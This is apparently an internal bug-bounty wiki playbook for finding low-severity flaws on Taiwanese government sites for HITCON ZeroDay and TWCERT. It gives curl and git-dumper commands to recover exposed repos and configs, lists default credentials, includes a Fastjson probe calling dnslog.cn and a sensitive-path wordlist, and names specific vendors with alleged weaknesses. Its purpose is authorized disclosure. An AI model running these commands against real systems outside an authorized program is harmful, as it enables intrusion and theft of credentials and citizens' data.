---
type: wiki
category: playbook
status: active
last-updated: 2026-04-21
---

# Government Sites / Low-Severity Bounty Quick Wins

> Applies to: Taiwanese government programs (HITCON ZeroDay / TWCERT / various ministry vulnerability disclosure programs), and any program where **even low severity still pays a bounty**.

## Why do government sites have easy pickings?

1. **Outsourcing ecosystem** — the same CMS/backend deployed across 50 agencies = one bug hits them all
2. **Legacy systems** — ASP/JSP/PHP 5.x are common, WebLogic 10g and IIS 6 are still running
3. **Dev habits** — `.bak`, `.old`, `backup.zip` often get dropped straight into the web root
4. **Shared credentials** — vendors like to use `admin/admin`, `admin/12345`, `vendorname+year`
5. **Low acceptance bar** — HITCON / TWCERT accept anything "low severity but genuinely reproducible"

## 1. Top 10 Quick Wins (ranked by ROI)

| # | Type | Tool | Detection Time | Approx. Bounty (TWD) |
|---|------|------|---------|-----------------|
| 1 | **`.git/` exposure** | `hunt-git-exposure` + git-dumper | 5 min | HITCON: CVE, ~1000-5000 |
| 2 | **`.env` / config leak** | `hunt-config-leak` | 1 min | HITCON ~1000-3000 |
| 3 | **phpinfo / WEB-INF exposure** | `hunt-config-leak` | 1 min | HITCON ~500-2000 |
| 4 | **Default credentials** (admin/admin) | `hunt-weak-login` | 3 min | HITCON: depends on backend privilege ~2000-10000 |
| 5 | **Backup file exposure** (backup.zip) | `hunt-backup-files` | 5 min | HITCON ~2000-5000 |
| 6 | **Swagger / API docs exposure** | `hunt-config-leak` | 1 min | HITCON ~500-1500 |
| 7 | **Spring Boot Actuator exposure** | `hunt-actuator-deep` | 3 min | HITCON ~2000-5000 |
| 8 | **Unrestricted Google Maps API key** | `hunt-google-api-key` | 5 min | HITCON ~500-2000 |
| 9 | **Known CVEs** (Struts2/Fastjson/Shiro) | `hunt-weak-login` + nuclei | 10 min | medium-high ~5000-30000 |
| 10 | **Directory traversal** (`../` / Index of) | `hunt-backup-files` | 3 min | HITCON ~1000-3000 |

## 2. Step-by-Step Playbooks

### Quick Win #1: `.git/` exposure

```bash
# One-liner
bbflow hunt target.gov.tw --only git-exposure

# Or manually
for path in / /git /repo /src /static; do
  curl -s "https://target.gov.tw${path}/.git/HEAD" | grep "^ref:"
done

# Once found, restore the full repo
git-dumper https://target.gov.tw/.git/ ./dump/
cd dump
git log --all --full-history -- "*password*" "*.env" "*.sql"
git show <commit>:config/database.yml
```

**Report tips:**
- Attach the content of `.git/config` (redact sensitive URLs)
- List how many commits can be restored (`git log --oneline | wc -l`)
- If credentials appear in history → add a point (highlight as P2/P3)

### Quick Win #2: `.env` / config leak

```bash
bbflow hunt target.gov.tw --only config-leak

# FAST=1 only runs P1/P2 paths (24 total, all under 30 seconds)
FAST=1 tools/hunters/hunt-config-leak.sh https://target.gov.tw
```

Commonly hit paths:
- `/.env` — Laravel / Django / various newer frameworks
- `/config.php.bak` — legacy PHP systems
- `/appsettings.json` — .NET Core
- `/application.yml`, `/application.properties` — Spring Boot
- `/WEB-INF/web.xml` — J2EE webapp exposure

**Report tips:**
- It's enough to prove the file is downloadable + contains sensitive fields (DB_PASSWORD, APP_KEY, JWT_SECRET)
- Don't overclaim as RCE unless you actually logged in using that credential

### Quick Win #3: phpinfo / WEB-INF exposure

```bash
bbflow hunt target.gov.tw --only config-leak

# Just look at phpinfo-related hits
grep -E "phpinfo|WEB-INF|server-status" workshop/target.gov.tw/hunters/config-leak/*.txt
```

Common filenames:
- `/phpinfo.php`, `/info.php`, `/test.php`, `/debug.php`
- `/WEB-INF/web.xml`, `/WEB-INF/classes/`
- `/server-status`, `/server-info` (Apache mod_status)

**Report tips:** these are usually P4 Info, but government programs often still pay a small bounty.

### Quick Win #4: Default credentials

```bash
bbflow hunt target.gov.tw --only weak-login

# Safe-mode only (no risk of accidental damage)
SAFE=1 tools/hunters/hunt-weak-login.sh https://target.gov.tw
```

Vendors checked:
- Nacos (nacos/nacos)
- Druid (admin/admin)
- Grafana (admin/admin)
- Jenkins (admin/admin)
- phpMyAdmin (root / root:root)
- Tomcat Manager (tomcat/tomcat)
- Solr (solr/SolrRocks)
- Zabbix (Admin/zabbix)
- RabbitMQ (guest/guest)

**Report tips:**
- Must prove you can actually log in (attach a screenshot or a post-login API response)
- Explain what's possible after login (read / modify / execute)
- If a government program has Jenkins admin access exposed → could be P1 RCE

### Quick Win #5: Backup file exposure

```bash
bbflow hunt target.gov.tw --only backup-files

# Add candidate names (when you know the agency's English/short name)
tools/hunters/hunt-backup-files.sh https://target.gov.tw agency-english-name agency-abbreviation
```

Commonly hit filenames (ranked by hit rate):
1. `/backup.zip`, `/www.zip`, `/wwwroot.zip`
2. `/site.zip`, `/web.zip`
3. `/db.sql`, `/dump.sql`, `/database.sql`
4. `/{target}.zip` — target name
5. `/backup/`, `/uploads/` — directory listing

**Report tips:**
- Attach `curl -I` output to prove content-type / size
- No need to download the whole archive — the first 256 bytes' magic number is enough proof

### Quick Win #6: Swagger / API docs exposure

```bash
bbflow hunt target.gov.tw --only config-leak

# Manual
for p in /swagger-ui.html /swagger/index.html /v2/api-docs /v3/api-docs /openapi.json /api-docs; do
  curl -sI "https://target.gov.tw${p}" | head -1
done
```

**Report tips:**
- Swagger itself is P4-P5, but endpoints listed inside it may have IDOR / auth bypass
- Once Swagger is found: look through it for endpoints that don't require auth

### Quick Win #7: Spring Boot Actuator exposure

```bash
bbflow hunt target.gov.tw --only actuator-deep

# Manually pull env
curl -s "https://target/actuator/env" | python3 -m json.tool | grep -iE "password|secret|key"
curl -s "https://target/actuator/heapdump" > heap.bin
# Analyze: jhat heap.bin or jvisualvm heap.bin
```

**Report tips:**
- `/actuator/env` leaking an application.yml property containing DB_PASSWORD → P2
- `/actuator/heapdump` leaking runtime memory → sometimes contains session tokens / secrets

### Quick Win #8: Google Maps API key

```bash
# First find an AIza* key via the envdata / sourcemap / js-secrets hunters
bbflow hunt target.gov.tw --only envdata,sourcemap,js-secrets

# Once found, verify it's unrestricted
tools/hunters/hunt-google-api-key.sh AIzaSy...XXX
```

**Report tips:**
- Must prove the key is unrestricted (can call paid APIs)
- Estimate financial impact: Static Maps $2/1000 req × daily quota usage
- These are usually P3-P4 (H1 2026 trend is mostly P4)

### Quick Win #9: Known CVEs (Struts2/Fastjson/Shiro)

```bash
# Official nuclei templates
bbflow hunt target.gov.tw --only nuclei

# Manually check for Shiro (rememberMe cookie)
curl -sI https://target.gov.tw/ | grep -i "Set-Cookie" | grep -i rememberMe

# Fastjson 1.2.x is common: send JSON in the POST body
curl -X POST https://target/api/xxx \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.net.Inet4Address","val":"dnslog.cn"}'
```

**Report tips:**
- If a government program is hit with a Shiro deserialization bug → P1 RCE, bounty can exceed NT$30k
- The PoC must demonstrate actual command execution (using dnslog.cn / Burp Collaborator)

### Quick Win #10: Directory traversal / Index of

```bash
bbflow hunt target.gov.tw --only backup-files
# Automatically checks /backup/ /uploads/ /files/ and 16 other common directories

# Manual
for d in /backup/ /backups/ /bak/ /db/ /upload/ /uploads/ /files/ /old/ /temp/ /tmp/; do
  curl -s "https://target.gov.tw${d}" | grep -oE "<title>Index of[^<]*"
done
```

**Report tips:**
- `Index of /xxx/` alone is only P5 Info
- But if the directory contains genuinely sensitive files (.env, .sql, .zip) → escalate
- Use `curl -s | grep href` to check the file listing before `wget -r`-ing everything

## 3. Government-Program-Specific Payload Dictionary

Add these to your ffuf wordlist (`tools/payloads/gov-paths.txt`):

```
phpinfo.php
info.php
test.php
debug.php
admin.php
admin.aspx
login.aspx
config.php.bak
config.php~
config.old
web.config
.env
.env.local
.env.production
backup.zip
www.zip
wwwroot.zip
site.zip
db.sql
database.sql
.git/config
.svn/entries
.DS_Store
WEB-INF/web.xml
WEB-INF/classes/
server-status
server-info
druid/index.html
nacos/
actuator/env
actuator/heapdump
swagger-ui.html
v2/api-docs
```

## 4. Common Taiwanese Government Vendors + Known Weaknesses

| Vendor | Common Targets | Common Weaknesses |
|------|---------|---------|
| Ruei-Yang Information | central ministries, National Health Insurance Administration | Vital-series CMS default credentials, .svn exposure |
| Linkwell Technology | Ministry of Education, universities | HyLib/HyRead-series IDOR, Swagger exposure |
| CSSI (Chunghwa System Integration) | Ministry of Economic Affairs, Ministry of Finance | legacy ASP systems, SQL injection |
| HualingTech | BPM / workflow systems | legacy JSP, .git exposure |
| Ares Information | financial holding companies, large enterprises | ironically, security vendors often have JS source map leaks |
| Chunghwa Telecom HiNet | general public-facing targets | single sign-on (SSO) vulnerabilities |
| Ragic (cloud database service) | cloud database services | API key exposure, order IDOR |

## 5. Submission Notes

### HITCON ZeroDay

- **Must mask the agency name with `{}`**: `{Ministry of X} vulnerability name`
- **Pick the right type** (see CLAUDE.md table) — picking wrong risks the system auto-suggesting a high severity that then gets rejected
- **Full PoC** — curl command, HTTP response, impact explanation
- **Screenshots** — reference them with `{{IMG#1}}`
- **Low severity is fine to submit** — as long as it's genuinely reproducible

### TWCERT

- Best suited for **CVE-type** vulnerabilities (ones that can be assigned a CVE number)
- Preferred outlet for firmware vulnerabilities
- Website vulnerabilities are better suited to HITCON

### Government-specific announcements

- The FSC (Financial Supervisory Commission) and NDC (National Development Council) occasionally run dedicated programs
- Higher bounties but narrower scope

## 6. Final Pre-Submission Checklist

- [ ] PoC reproduced independently with curl (not dependent on a Burp session)
- [ ] Vulnerability type classified accurately (don't file a source map leak under "Disclosure of Secrets")
- [ ] Severity matches reality (don't overclaim as RCE)
- [ ] Cross-checked against already-published HITCON reports for duplicates
- [ ] Screenshot + description + reproduction steps all included together

## Related Documents

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md)
- [10-hunter-config-leak.md](10-hunter-config-leak.md)
- [11-hunter-weak-login.md](11-hunter-weak-login.md)
- [12-hunter-backup-files.md](12-hunter-backup-files.md)
- [86-dupe-hunting-report-writing.md](86-dupe-hunting-report-writing.md) — report writing
